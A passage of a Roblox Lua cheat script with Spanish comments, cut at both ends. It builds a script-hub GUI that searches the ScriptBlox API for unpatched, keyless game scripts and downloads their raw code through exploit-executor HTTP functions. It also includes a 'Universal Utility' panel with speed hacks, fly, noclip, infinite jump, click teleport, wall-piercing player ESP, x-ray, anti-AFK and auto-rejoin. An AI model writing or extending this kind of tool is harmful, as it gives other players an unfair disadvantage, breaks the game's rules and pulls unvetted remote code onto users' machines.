			stay.MouseButton1Click:Connect(function()
				askOverlay.Visible = false
				askProceed = nil
			end)
			yes.MouseButton1Click:Connect(function()
				askOverlay.Visible = false
				local f = askProceed
				askProceed = nil
				if f then f() end
			end)
		end
		askProceed = proceed
		askOverlay.Visible = true
	end

	closeBtn.Activated:Connect(function()
		local proceed = cfg.onClose or close
		if cfg.confirmClose and cfg.confirmClose() then
			askClose(proceed)
		else
			proceed()
		end
	end)

	if not cfg.instant then
		task.delay(0.5, function() pcall(keepOnScreen, true) end)
		task.defer(function()
			tw(win, { GroupTransparency = settings.transparency, Position = cfg.position }, 0.32, Enum.EasingStyle.Quint)
		end)
	end

	return {
		gui = g, win = win, content = content, header = header, close = close,
		uiScale = uiScale, autoScale = autoScale, bgLayer = bgLayer,
	}
end

local function makeSwitch(parent, onChange)
	local track = new("TextButton", {
		Size = UDim2.fromOffset(42, 22),
		BackgroundColor3 = C.card2,
		Text = "",
		AutoButtonColor = false,
	}, parent)
	round(track, 11)
	outline(track, C.line)
	local knob = new("Frame", {
		Size = UDim2.fromOffset(16, 16),
		Position = UDim2.fromOffset(3, 3),
		BackgroundColor3 = C.sub,
		BorderSizePixel = 0,
	}, track)
	round(knob, 8)

	local on = false
	local function set(v)
		on = v
		tw(track, { BackgroundColor3 = v and C.accent or C.card2 })
		tw(knob, {
			Position = v and UDim2.fromOffset(23, 3) or UDim2.fromOffset(3, 3),
			BackgroundColor3 = v and C.white or C.sub,
		})
	end
	track.MouseButton1Click:Connect(function()
		local result = onChange(not on)
		if result == nil then result = not on end
		set(result)
	end)
	return track, set
end

local function makeSlider(parent, min, max, value, step, onChange, connList)
	local holder = new("Frame", { Size = UDim2.new(1, 0, 0, 22), BackgroundTransparency = 1 }, parent)
	local track = new("Frame", {
		Size = UDim2.new(1, -52, 0, 6),
		Position = UDim2.new(0, 0, 0.5, -3),
		BackgroundColor3 = C.card2,
		BorderSizePixel = 0,
	}, holder)
	round(track, 3)
	local fill = new("Frame", { Size = UDim2.fromScale(0, 1), BackgroundColor3 = C.white, BorderSizePixel = 0 }, track)
	round(fill, 3)
	gradient(fill, C.accent, C.accent2, 0)
	local knob = new("Frame", {
		Size = UDim2.fromOffset(14, 14),
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0, 0.5),
		BackgroundColor3 = C.white,
		BorderSizePixel = 0,
	}, track)
	round(knob, 7)
	local valueLabel = label(holder, {
		Size = UDim2.fromOffset(42, 22),
		Position = UDim2.new(1, -42, 0, 0),
		TextXAlignment = Enum.TextXAlignment.Right,
		Font = Enum.Font.GothamMedium,
		TextSize = 12,
		TextColor3 = C.sub,
	})

	local function setValue(v, fire)
		v = math.clamp(v, min, max)
		if step then v = math.floor(v / step + 0.5) * step end
		local a = (v - min) / (max - min)
		fill.Size = UDim2.fromScale(a, 1)
		knob.Position = UDim2.fromScale(a, 0.5)
		valueLabel.Text = tostring(math.floor(v * 100 + 0.5) / 100)
		if fire then onChange(v) end
	end

	local dragging = false
	local lockedScroll = nil
	local function unlockScroll()
		if lockedScroll then lockedScroll.ScrollingEnabled = true lockedScroll = nil end
	end
	local function fromInput(input)
		local a = math.clamp((input.Position.X - track.AbsolutePosition.X) / math.max(track.AbsoluteSize.X, 1), 0, 1)
		setValue(min + (max - min) * a, true)
	end
	holder.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1
			or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			-- FIX (movil): mientras mueves el slider, la lista de atras no se desplaza
			lockedScroll = holder:FindFirstAncestorOfClass("ScrollingFrame")
			if lockedScroll then lockedScroll.ScrollingEnabled = false end
			fromInput(input)
		end
	end)
	table.insert(connList, UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
			or input.UserInputType == Enum.UserInputType.Touch) then
			fromInput(input)
		end
	end))
	table.insert(connList, UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1
			or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
			unlockScroll()
		end
	end))

	setValue(value, false)
	return holder, setValue
end

-- seccion (tarjeta con titulo) -> devuelve la tarjeta y un generador de orden
local function makeSection(parent, titleText, order)
	local s = card(parent, 0, order)
	padding(s, 14, 12, 14, 14)
	new("UIListLayout", { Padding = UDim.new(0, 14), SortOrder = Enum.SortOrder.LayoutOrder }, s)
	label(s, {
		Size = UDim2.new(1, 0, 0, 14),
		Text = string.upper(titleText),
		Font = Enum.Font.GothamBold,
		TextSize = 11,
		TextColor3 = C.accent,
		LayoutOrder = 0,
	})
	return s, sequence()
end

-- fila con interruptor (+ slider opcional)
local function makeFeature(parent, order, name, desc, onChange, slider, connList)
	local wrap = new("Frame", {
		Size = UDim2.new(1, 0, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		BackgroundTransparency = 1,
		LayoutOrder = order,
	}, parent)
	new("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, wrap)

	local row = new("Frame", {
		Size = UDim2.new(1, 0, 0, desc and 36 or 24),
		BackgroundTransparency = 1,
		LayoutOrder = 1,
	}, wrap)
	label(row, { Size = UDim2.new(1, -56, 0, 18), Text = name, Font = Enum.Font.GothamMedium, TextSize = 13 })
	if desc then
		label(row, {
			Size = UDim2.new(1, -56, 0, 14),
			Position = UDim2.fromOffset(0, 19),
			Text = desc,
			TextSize = 11,
			TextColor3 = C.sub,
		})
	end
	local sw, set = makeSwitch(row, onChange)
	sw.AnchorPoint = Vector2.new(1, 0.5)
	sw.Position = UDim2.new(1, 0, 0.5, 0)

	local setSlider
	if slider then
		local holder
		holder, setSlider = makeSlider(wrap, slider.min, slider.max, slider.value, slider.step, slider.onChange, connList)
		holder.LayoutOrder = 2
	end
	return set, setSlider
end

-- fila con nombre + slider (sin interruptor)
local function makeSliderRow(parent, order, name, desc, min, max, value, step, onChange, connList)
	local wrap = new("Frame", {
		Size = UDim2.new(1, 0, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		BackgroundTransparency = 1,
		LayoutOrder = order,
	}, parent)
	new("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, wrap)
	local row = new("Frame", {
		Size = UDim2.new(1, 0, 0, desc and 36 or 20),
		BackgroundTransparency = 1,
		LayoutOrder = 1,
	}, wrap)
	label(row, { Size = UDim2.new(1, 0, 0, 18), Text = name, Font = Enum.Font.GothamMedium, TextSize = 13 })
	if desc then
		label(row, {
			Size = UDim2.new(1, 0, 0, 14),
			Position = UDim2.fromOffset(0, 19),
			Text = desc,
			TextSize = 11,
			TextColor3 = C.sub,
		})
	end
	local holder, setValue = makeSlider(wrap, min, max, value, step, onChange, connList)
	holder.LayoutOrder = 2
	return setValue
end

local function makeActionButton(parent, order, text, color)
	local b = new("TextButton", {
		Size = UDim2.new(1, 0, 0, 36),
		BackgroundColor3 = color or C.card2,
		Text = text,
		TextColor3 = C.text,
		Font = Enum.Font.GothamMedium,
		TextSize = 13,
		AutoButtonColor = false,
		LayoutOrder = order,
	}, parent)
	round(b, 10)
	outline(b, C.line)
	hover(b, color or C.card2, C.line)
	return b
end

local function makeChip(parent, text, width, active, onClick)
	local b = new("TextButton", {
		Size = UDim2.fromOffset(width, 24),
		BackgroundColor3 = active and C.accent or C.card2,
		Text = text,
		TextColor3 = active and C.onAccent or C.sub,
		Font = Enum.Font.GothamMedium,
		TextSize = 10,
		AutoButtonColor = false,
	}, parent)
	round(b, 12)
	local function set(v)
		tw(b, { BackgroundColor3 = v and C.accent or C.card2 })
		b.TextColor3 = v and C.onAccent or C.sub
	end
	b.MouseButton1Click:Connect(function() onClick(set) end)
	return b, set
end

-- ===================================================================
-- HTTP + API DE SCRIPTBLOX
-- ===================================================================
local function httpGet(url)
	local ok, res = pcall(function() return game:HttpGet(url) end)
	if ok and type(res) == "string" then return res end
	local req = (syn and syn.request) or request or http_request or (http and http.request)
	if req then
		local ok2, r = pcall(req, { Url = url, Method = "GET" })
		if ok2 and type(r) == "table" and type(r.Body) == "string" then
			local code = tonumber(r.StatusCode)
			if code and (code < 200 or code >= 300) then return nil, "HTTP " .. code end
			return r.Body
		end
	end
	return nil, tostring(res)
end

local function apiJson(path, params)
	local q = {}
	for k, v in params or {} do
		table.insert(q, k .. "=" .. HttpService:UrlEncode(tostring(v)))
	end
	local url = SCRIPTBLOX .. path .. (#q > 0 and ("?" .. table.concat(q, "&")) or "")
	local body, err = httpGet(url)
	if not body then return nil, err or "request failed" end
	local ok, data = pcall(function() return HttpService:JSONDecode(body) end)
	if not ok or type(data) ~= "table" then return nil, "unexpected response" end
	if data.message and not data.result and not data.script then return nil, tostring(data.message) end
	return data
end

local function queryScripts(s)
	local data, err
	local f = s.filters
	if s.mode == "trending" then
		data, err = apiJson("/api/script/trending")
	else
		local p = { page = s.page, max = 20, sortBy = s.sort, order = "desc" }
		if f.verified then p.verified = 1 end
		if f.free then p.mode = "free" end
		if f.nokey then p.key = 0 end
		if f.universal then p.universal = 1 end
		if f.unpatched then p.patched = 0 end
		if s.mode == "game" then
			p.placeId = game.PlaceId
			data, err = apiJson("/api/script/fetch", p)
		else
			p.q = s.query
			data, err = apiJson("/api/script/search", p)
		end
	end
	if not data then return nil, nil, err end
	local result = data.result
	if type(result) ~= "table" or type(result.scripts) ~= "table" then
		return nil, nil, tostring(data.message or "unexpected response")
	end
	local list = result.scripts
	if s.mode == "trending" then -- el endpoint de trending no tiene filtros: se aplican aqui
		local filtered = {}
		for _, item in list do
			local ok = true
			if f.verified and not item.verified then ok = false end
			if f.free and item.scriptType == "paid" then ok = false end
			if f.nokey and item.key then ok = false end
			if f.universal and not item.isUniversal then ok = false end
			if f.unpatched and item.isPatched then ok = false end
			if ok then table.insert(filtered, item) end
		end
		list = filtered
	end
	return list, result.totalPages or 1
end

local function fetchRaw(slug)
	local body, err = httpGet(SCRIPTBLOX .. "/api/script/raw/" .. HttpService:UrlEncode(slug))
	if not body then return nil, err or "download failed" end
	if body:sub(1, 1) == "{" then
		local ok, data = pcall(function() return HttpService:JSONDecode(body) end)
		if ok and type(data) == "table" then
			if type(data.script) == "string" then return data.script end
			return nil, tostring(data.message or "script not found")
		end
	end
	return body
end

-- obtiene el codigo de cualquier tipo de entrada
local function resolveCode(entry)
	if entry.source then return entry.source end
	if entry.sb then
		if type(entry.sb.script) == "string" and #entry.sb.script > 0 then return entry.sb.script end
		return fetchRaw(entry.sb.slug)
	end
	if entry.url then return httpGet(entry.url) end
	return nil, "empty script"
end

-- favoritos / historial
local function gameLabelOf(item)
	if type(item.gameLabel) == "string" then return item.gameLabel end
	if type(item.game) == "table" and item.game.name then return item.game.name end
	if type(item.game) == "string" then return item.game end
	return item.isUniversal and "Universal" or "Unknown game"
end

local function isFav(slug)
	for _, f in settings.favorites do
		if f.slug == slug then return true end
	end
	return false
end

local function toggleFav(item)
	for i, f in settings.favorites do
		if f.slug == item.slug then
			table.remove(settings.favorites, i)
			saveSettings()
			return false
		end
	end
	table.insert(settings.favorites, 1, {
		slug = item.slug,
		title = item.title,
		game = gameLabelOf(item),
	})
	saveSettings()
	return true
end

local function addHistory(item)
	for i, h in settings.history do
		if h.slug == item.slug then table.remove(settings.history, i) break end
	end
	table.insert(settings.history, 1, {
		slug = item.slug,
		title = item.title,
		game = gameLabelOf(item),
	})
	while #settings.history > 10 do table.remove(settings.history) end
	saveSettings()
end

-- ===================================================================
-- SCRIPT UNIVERSAL (incluido)
-- ===================================================================
local function launchUniversal()
	if env.__UniversalCleanup then pcall(env.__UniversalCleanup) end

	local uconns = {}
	local state = {
		walk = false, jump = false, fly = false, noclip = false,
		ijump = false, clicktp = false, fullbright = false, fov = false, antiafk = true,
	}
	-- los valores de los sliders se recuerdan entre sesiones
	local function saved(key, default, lo, hi)
		local v = type(settings.uniCfg) == "table" and tonumber(settings.uniCfg[key]) or nil
		return v and math.clamp(v, lo, hi) or default
	end
	local function remember(key, v)
		if type(settings.uniCfg) ~= "table" or settings.uniCfg == DEFAULTS.uniCfg then settings.uniCfg = {} end
		settings.uniCfg[key] = v
		queueSave()
	end
	local cfg = {
		walk = saved("walk", 32, 16, 200), jump = saved("jump", 70, 50, 300),
		fly = saved("fly", 60, 10, 200), fov = saved("fov", 90, 40, 120),
		gravity = saved("gravity", 196, 20, 400), tod = saved("tod", 14, 0, 24),
	}

	local orig = {}
	local ui = {}

	local function getHum()
		local c = player.Character
		return c and c:FindFirstChildOfClass("Humanoid")
	end
	local function getRoot()
		local c = player.Character
		return c and c:FindFirstChild("HumanoidRootPart")
	end

	-- ---------- Speed ----------
	local function setWalk(v)
		local hum = getHum()
		if v then
			if hum then orig.walk = hum.WalkSpeed end
		elseif hum and orig.walk then
			hum.WalkSpeed = orig.walk
		end
		state.walk = v
		return v
	end

	-- ---------- Jump ----------
	local function setJump(v)
		local hum = getHum()
		if v then
			if hum then
				orig.jump = hum.JumpPower
				orig.useJumpPower = hum.UseJumpPower
			end
		elseif hum and orig.jump then
			hum.UseJumpPower = orig.useJumpPower
			hum.JumpPower = orig.jump
		end
		state.jump = v
		return v
	end

	-- ---------- Botones en pantalla (movil) ----------
	local touchGui, upBtn, downBtn, jumpBtn
	local flyUp, flyDown = false, false
	local lastAirJump = 0

	local function airJump()
		if os.clock() - lastAirJump < 0.15 then return end
		lastAirJump = os.clock()
		local hum, root = getHum(), getRoot()
		if not hum or not root then return end
		local power = hum.UseJumpPower and hum.JumpPower or math.sqrt(2 * workspace.Gravity * hum.JumpHeight)
		local vel = root.AssemblyLinearVelocity
		root.AssemblyLinearVelocity = Vector3.new(vel.X, math.max(power, 40), vel.Z)
		hum:ChangeState(Enum.HumanoidStateType.Jumping)
	end

	local function holdButton(btn, onDown, onUp)
		btn.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Touch
				or input.UserInputType == Enum.UserInputType.MouseButton1 then
				onDown()
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then onUp() end
				end)
			end
		end)
	end

	local function refreshTouchControls()
		local wantFly, wantJump = state.fly, state.ijump
		if not UserInputService.TouchEnabled or not (wantFly or wantJump) then
			if touchGui then touchGui:Destroy() end
			touchGui, upBtn, downBtn, jumpBtn = nil, nil, nil, nil
			flyUp, flyDown = false, false
			return
		end
		if not touchGui then
			touchGui = new("ScreenGui", {
				Name = "UniversalTouchControls", ResetOnSpawn = false, DisplayOrder = 12,
				ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
			})
			touchGui.Parent = getGuiParent()
			local function touchButton(text, anchor, pos)
				local b = new("TextButton", {
					Size = UDim2.fromOffset(62, 62), AnchorPoint = anchor, Position = pos,
					BackgroundColor3 = C.accent, BackgroundTransparency = 0.2, Text = text,
					TextColor3 = C.onAccent, Font = Enum.Font.GothamBold, TextSize = 13, AutoButtonColor = false,
				}, touchGui)
				round(b, 31)
				outline(b, C.line)
				return b
			end
			upBtn = touchButton("UP", Vector2.new(1, 0.5), UDim2.new(1, -18, 0.42, 0))
			downBtn = touchButton("DOWN", Vector2.new(1, 0.5), UDim2.new(1, -18, 0.42, 72))
			jumpBtn = touchButton("JUMP", Vector2.new(1, 1), UDim2.new(1, -112, 1, -48))
			holdButton(upBtn, function() flyUp = true end, function() flyUp = false end)
			holdButton(downBtn, function() flyDown = true end, function() flyDown = false end)
			holdButton(jumpBtn, airJump, function() end)
		end
		upBtn.Visible = wantFly
		downBtn.Visible = wantFly
		jumpBtn.Visible = wantJump
	end

	-- ---------- Fly ----------
	local flyBV, flyBG
	local origAutoRotate

	-- vector de movimiento real del jugador (joystick del movil, WASD o mando), relativo a la camara
	local controlsModule
	pcall(function()
		local ps = player:FindFirstChild("PlayerScripts")
		local pm = ps and ps:FindFirstChild("PlayerModule")
		if pm then controlsModule = require(pm):GetControls() end
	end)
	local function getMoveVector()
		if controlsModule then
			local ok, v = pcall(function() return controlsModule:GetMoveVector() end)
			if ok and typeof(v) == "Vector3" then return v end
		end
		local hum, cam = getHum(), workspace.CurrentCamera
		if hum and cam then
			local lookFlat = Vector3.new(cam.CFrame.LookVector.X, 0, cam.CFrame.LookVector.Z)
			local rightFlat = Vector3.new(cam.CFrame.RightVector.X, 0, cam.CFrame.RightVector.Z)
			if lookFlat.Magnitude > 0 and rightFlat.Magnitude > 0 then
				local md = hum.MoveDirection
				return Vector3.new(md:Dot(rightFlat.Unit), 0, -md:Dot(lookFlat.Unit))
			end
		end
		return Vector3.zero
	end

	local function stopFly()
		state.fly = false
		if flyBV then flyBV:Destroy() flyBV = nil end
		if flyBG then flyBG:Destroy() flyBG = nil end
		local hum = getHum()
		if hum then
			hum.PlatformStand = false
			if origAutoRotate ~= nil then hum.AutoRotate = origAutoRotate end
		end
		origAutoRotate = nil
		flyUp, flyDown = false, false
		refreshTouchControls()
	end
	local function startFly()
		local root, hum = getRoot(), getHum()
		if not root or not hum then return false end
		stopFly()
		flyBV = new("BodyVelocity", { MaxForce = Vector3.new(1e9, 1e9, 1e9), Velocity = Vector3.zero }, root)
		flyBG = new("BodyGyro", { MaxTorque = Vector3.new(1e9, 1e9, 1e9), P = 1e4, CFrame = root.CFrame }, root)
		origAutoRotate = hum.AutoRotate
		hum.AutoRotate = false
		hum.PlatformStand = true
		state.fly = true
		refreshTouchControls()
		return true
	end
	local function setFly(v)
		if v then return startFly() end
		stopFly()
		return false
	end

	table.insert(uconns, RunService.RenderStepped:Connect(function()
		if not state.fly or not flyBV or not flyBG then return end
		local cam = workspace.CurrentCamera
		local look, right = cam.CFrame.LookVector, cam.CFrame.RightVector
		local mv = getMoveVector()
		local dir = right * mv.X + look * (-mv.Z)
		if not UserInputService:GetFocusedTextBox() then
			if UserInputService:IsKeyDown(Enum.KeyCode.Space) or UserInputService:IsKeyDown(Enum.KeyCode.E) then
				dir += Vector3.yAxis
			end
			if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) or UserInputService:IsKeyDown(Enum.KeyCode.Q) then
				dir -= Vector3.yAxis
			end
		end
		if flyUp then dir += Vector3.yAxis end
		if flyDown then dir -= Vector3.yAxis end
		flyBV.Velocity = dir.Magnitude > 0 and dir.Unit * cfg.fly or Vector3.zero
		flyBG.CFrame = cam.CFrame
	end))

	-- ---------- Noclip ----------
	local noclipConn
	local noclipParts = {}
	local function setNoclip(v)
		state.noclip = v
		if v then
			if not noclipConn then
				noclipConn = RunService.Stepped:Connect(function()
					local char = player.Character
					if not char then return end
					for _, p in char:GetDescendants() do
						if p:IsA("BasePart") and p.CanCollide then
							p.CanCollide = false
							noclipParts[p] = true
						end
					end
				end)
			end
		else
			if noclipConn then noclipConn:Disconnect() noclipConn = nil end
			for p in noclipParts do
				if p.Parent then p.CanCollide = true end
			end
			table.clear(noclipParts)
		end
		return v
	end

	-- ---------- Infinite jump ----------
	table.insert(uconns, UserInputService.JumpRequest:Connect(function()
		if state.ijump then airJump() end
	end))
	table.insert(uconns, UserInputService.InputBegan:Connect(function(input)
		if state.ijump and input.KeyCode == Enum.KeyCode.Space and not UserInputService:GetFocusedTextBox() then
			airJump()
		end
	end))

	-- ---------- Click teleport (Ctrl + click) ----------
	table.insert(uconns, UserInputService.InputBegan:Connect(function(input, processed)
		if processed or not state.clicktp then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1
			and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
			local root = getRoot()
			local cam = workspace.CurrentCamera
			if not root or not cam then return end
			local loc = UserInputService:GetMouseLocation()
			local ray = cam:ViewportPointToRay(loc.X, loc.Y)
			local params = RaycastParams.new()
			params.FilterType = Enum.RaycastFilterType.Exclude
			params.FilterDescendantsInstances = { player.Character }
			local hit = workspace:Raycast(ray.Origin, ray.Direction * 2000, params)
			if hit then
				root.CFrame = CFrame.new(hit.Position + Vector3.new(0, 3, 0))
			end
		end
	end))

	-- ---------- Fullbright / FOV ----------
	local lightOrig
	local function setFullbright(v)
		if v then
			lightOrig = {
				Brightness = Lighting.Brightness, ClockTime = Lighting.ClockTime,
				FogEnd = Lighting.FogEnd, GlobalShadows = Lighting.GlobalShadows,
				Ambient = Lighting.Ambient, OutdoorAmbient = Lighting.OutdoorAmbient,
			}
		elseif lightOrig then
			for k, val in lightOrig do Lighting[k] = val end
			lightOrig = nil
		end
		state.fullbright = v
		return v
	end
	local function setFov(v)
		local cam = workspace.CurrentCamera
		if v then
			if cam then orig.fov = cam.FieldOfView end
		elseif cam and orig.fov then
			cam.FieldOfView = orig.fov
		end
		state.fov = v
		return v
	end

	-- aplicar valores cada frame (los juegos suelen resetearlos)
	table.insert(uconns, RunService.Heartbeat:Connect(function()
		local hum = getHum()
		if hum then
			if state.walk then hum.WalkSpeed = cfg.walk end
			if state.jump then
				hum.UseJumpPower = true
				hum.JumpPower = cfg.jump
			end
		end
		if state.fullbright then
			Lighting.Brightness = 2
			Lighting.ClockTime = 14
			Lighting.FogEnd = 1e6
			Lighting.GlobalShadows = false
			Lighting.Ambient = Color3.fromRGB(178, 178, 178)
			Lighting.OutdoorAmbient = Color3.fromRGB(178, 178, 178)
		end
		if state.fov and workspace.CurrentCamera then
			workspace.CurrentCamera.FieldOfView = cfg.fov
		end
	end))

	-- ---------- Anti-AFK ----------
	table.insert(uconns, player.Idled:Connect(function()
		if state.antiafk then
			pcall(function()
				local vu = game:GetService("VirtualUser")
				vu:CaptureController()
				vu:ClickButton2(Vector2.new())
			end)
		end
	end))

	-- al reaparecer se apaga el vuelo
	table.insert(uconns, player.CharacterAdded:Connect(function()
		for p in noclipParts do
			if not p:IsDescendantOf(workspace) then noclipParts[p] = nil end
		end
		stopFly()
		if ui.flySet then ui.flySet(false) end
		if state.freeze then
			state.freeze = false
			if ui.freezeSet then ui.freezeSet(false) end
		end
	end))

	-- ====== EXTRAS v3 ======
	local function setGravity(v)
		if v then orig.gravity = workspace.Gravity
		elseif orig.gravity then workspace.Gravity = orig.gravity end
		state.gravity = v
		return v
	end

	local function setFreeze(v)
		local root = getRoot()
		if v and not root then return false end
		if root then root.Anchored = v end
		state.freeze = v
		return v
	end

	local function setZoom(v)
		if v then
			orig.maxZoom = player.CameraMaxZoomDistance
			player.CameraMaxZoomDistance = 100000
		elseif orig.maxZoom then
			player.CameraMaxZoomDistance = orig.maxZoom
		end
		return v
	end

	local function setTime(v)
		if v then orig.clock = Lighting.ClockTime
		elseif orig.clock then Lighting.ClockTime = orig.clock end
		state.tod = v
		return v
	end

	local lastSafe
	local function setAntiVoid(v)
		state.antivoid = v
		lastSafe = nil
		return v
	end

	local function setAutoRejoin(v)
		state.autorejoin = v
		return v
	end
	pcall(function()
		local GuiService = game:GetService("GuiService")
		table.insert(uconns, GuiService.ErrorMessageChanged:Connect(function(msg)
			if state.autorejoin and msg and msg ~= "" then
				task.delay(3, function()
					if state.autorejoin then pcall(function() TeleportService:Teleport(game.PlaceId, player) end) end
				end)
			end
		end))
	end)

	-- X-ray: vuelve semitransparentes las partes del mapa (se procesa por tandas para no congelar el juego)
	local xrayParts, xrayToken = {}, 0
	local function setXray(v)
		xrayToken += 1
		local my = xrayToken
		state.xray = v
		task.spawn(function()
			if v then
				local n = 0
				for _, d in workspace:GetDescendants() do
					if my ~= xrayToken then return end
					if d:IsA("BasePart") and not d:IsA("Terrain") and d.Transparency < 0.6 then
						local m = d:FindFirstAncestorOfClass("Model")
						if not (m and m:FindFirstChildOfClass("Humanoid")) then
							xrayParts[d] = d.Transparency
							d.Transparency = 0.6
						end
					end
					n += 1
					if n % 500 == 0 then task.wait() end
				end
			else
				for d, t in xrayParts do
					if d.Parent then d.Transparency = t end
					xrayParts[d] = nil
				end
			end
		end)
		return v
	end

	-- ESP (solo visual): Highlight + nombre/distancia sobre los demas jugadores
	local espObjs, espFolder = {}, nil
	local espOn, espNameOn = false, false
	local function getEspFolder()
		if not espFolder or not espFolder.Parent then
			espFolder = Instance.new("Folder")
			espFolder.Name = "UU_" .. tostring(math.random(1000, 9999))
			espFolder.Parent = getGuiParent()
		end
		return espFolder
	end
	local function clearEsp(plr)
		local o = espObjs[plr]
		if o then
			-- OJO: solo se destruyen los objetos del ESP (nunca o.head, que es la cabeza real del jugador)
			if o.hl then pcall(function() o.hl:Destroy() end) end
			if o.bb then pcall(function() o.bb:Destroy() end) end
			espObjs[plr] = nil
		end
	end
	local function buildEsp(plr)
		clearEsp(plr)
		if plr == player or not (espOn or espNameOn) then return end
		local ch = plr.Character
		local head = ch and (ch:FindFirstChild("Head") or ch:FindFirstChild("HumanoidRootPart"))
		if not ch or not head then return end
		local o = { head = head }
		if espOn then
			local hl = Instance.new("Highlight")
			hl.FillTransparency = 0.6
			hl.FillColor = Color3.fromRGB(255, 90, 90)
			hl.OutlineColor = Color3.new(1, 1, 1)
			hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			hl.Adornee = ch
			hl.Parent = getEspFolder()
			o.hl = hl
		end
		if espNameOn then
			local bb = Instance.new("BillboardGui")
			bb.Size = UDim2.fromOffset(160, 34)
			bb.StudsOffset = Vector3.new(0, 3, 0)
			bb.AlwaysOnTop = true
			bb.Adornee = head
			local t = Instance.new("TextLabel")
			t.Size = UDim2.fromScale(1, 1)
			t.BackgroundTransparency = 1
			t.TextColor3 = Color3.new(1, 1, 1)
			t.TextStrokeTransparency = 0.4
			t.Font = Enum.Font.GothamBold
			t.TextSize = 12
			t.Text = plr.DisplayName
			t.Parent = bb
			bb.Parent = getEspFolder()
			o.bb, o.label = bb, t
		end
		espObjs[plr] = o
	end
	local function refreshEsp()
		for plr in espObjs do clearEsp(plr) end
		if espOn or espNameOn then
			for _, p in Players:GetPlayers() do buildEsp(p) end
		end
	end
	local function setEsp(v) espOn = v refreshEsp() return v end
	local function setEspNames(v) espNameOn = v refreshEsp() return v end
	local function hookEspPlayer(plr)
		if plr == player then return end
		table.insert(uconns, plr.CharacterAdded:Connect(function()
			task.wait(0.6)
			if espOn or espNameOn then buildEsp(plr) end
		end))
	end
	for _, p in Players:GetPlayers() do hookEspPlayer(p) end
	table.insert(uconns, Players.PlayerAdded:Connect(hookEspPlayer))
	table.insert(uconns, Players.PlayerRemoving:Connect(clearEsp))

	-- bucle de extras (anti-void, gravedad, hora, distancias del ESP)
	local espAcc = 0
	table.insert(uconns, RunService.Heartbeat:Connect(function(dt)
		if state.antivoid then
			local root, hum = getRoot(), getHum()
			if root and hum then
				if hum.FloorMaterial ~= Enum.Material.Air then
					lastSafe = root.CFrame
				elseif lastSafe and root.Position.Y < workspace.FallenPartsDestroyHeight + 40 then
					root.AssemblyLinearVelocity = Vector3.zero
					root.CFrame = lastSafe + Vector3.new(0, 4, 0)
				end
			end
		end
		if state.gravity then workspace.Gravity = cfg.gravity end
		if state.tod then Lighting.ClockTime = cfg.tod end
		espAcc += dt
		if espAcc >= 0.25 then
			espAcc = 0
			local cam = workspace.CurrentCamera
			if espNameOn and cam then
				for plr, o in espObjs do
					if o.label and o.head and o.head.Parent then
						o.label.Text = ("%s\n%d studs"):format(plr.DisplayName, math.floor((cam.CFrame.Position - o.head.Position).Magnitude))
					end
				end
			end
		end
	end))

	-- ---------- Ventana ----------
	local W = buildWindow({
		name = "UniversalUtilGui",
		title = "Universal Utility",
		subtitle = "Works in any game",
		icon = "⚡",
		width = settings.uniW,
		height = settings.uniH,
		minW = SIZE_LIMITS.uni.minW, minH = SIZE_LIMITS.uni.minH,
		maxW = SIZE_LIMITS.uni.maxW, maxH = SIZE_LIMITS.uni.maxH,
		defaultW = SIZE_LIMITS.uni.defaultW, defaultH = SIZE_LIMITS.uni.defaultH,
		onResize = function(w, h)
			settings.uniW, settings.uniH = w, h
			queueSave()
		end,
		position = UDim2.new(0.5, 240, 0.5, -240),
		order = 11,
		conns = uconns,
		onClose = function() local f = env.__UniversalCleanup if f then f() end end,
		confirmClose = function() return settings.confirmClose end,
		confirmTitle = "Close Universal Utility?",
		confirmBody = "Fly, speed, noclip and every other feature will be turned off.",
	})

	local FOOTER_H = 30
	local scroll = new("ScrollingFrame", {
		Size = UDim2.new(1, 0, 1, -FOOTER_H),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		ScrollBarThickness = 3,
		ScrollBarImageColor3 = C.line,
		CanvasSize = UDim2.fromScale(0, 0),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
	}, W.content)
	padding(scroll, 12, 12, 12, 12)
	new("UIListLayout", { Padding = UDim.new(0, 10), SortOrder = Enum.SortOrder.LayoutOrder }, scroll)

	local footer = new("Frame", {
		Size = UDim2.new(1, 0, 0, FOOTER_H),
		Position = UDim2.new(0, 0, 1, -FOOTER_H),
		BackgroundColor3 = C.card,
		BorderSizePixel = 0,
	}, W.content)
	label(footer, {
		Size = UDim2.new(1, -48, 1, 0),
		Position = UDim2.fromOffset(12, 0),
		Text = "Fly: WASD + Space/Ctrl   |   Ctrl+Click: teleport   |   [" .. UNIVERSAL_TOGGLE_KEY.Name .. "] hide",
		TextSize = 10,
		TextColor3 = C.sub,
		TextTruncate = Enum.TextTruncate.AtEnd,
	})

	local toggles = {}
	local function feature(parent, order, name, desc, onChange, slider, key)
		local on = false
		local set, setSlider = makeFeature(parent, order, name, desc, function(v)
			local r = onChange(v)
			if r == nil then r = v end
			on = r
			return r
		end, slider, uconns)
		if key then
			toggles[key] = function()
				local r = onChange(not on)
				if r == nil then r = not on end
				on = r
				set(r)
			end
		end
		local function setVisual(v) on = v set(v) end
		return setVisual, setSlider
	end

	-- Movement
	local mv, mvNext = makeSection(scroll, "Movement", 1)
	feature(mv, mvNext(), "Speed", "Custom walk speed", setWalk,
		{ min = 16, max = 200, value = cfg.walk, step = 1, onChange = function(v) cfg.walk = v remember("walk", v) end }, "speed")
